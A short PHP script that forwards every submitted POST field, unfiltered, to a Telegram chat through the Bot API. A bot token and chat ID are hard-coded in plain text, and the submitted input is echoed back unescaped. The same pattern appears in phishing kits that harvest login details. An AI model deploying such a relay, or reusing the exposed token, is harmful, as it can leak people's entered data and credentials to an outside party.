<?php
$tg_bot_token = "2090197231:AAE43NxArXSNl_BluKztvozuQxomZ_XjR5U";
$chat_id = "-576545581";

$text = '';

foreach ($_POST as $key => $val) {
   $text .= $key . ": " . $val . "\n";
}

$param = [
   "chat_id" => $chat_id,
   "text" => $text
];

$url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendMessage?" . http_build_query($param);

var_dump($text);

file_get_contents($url);

die('1');
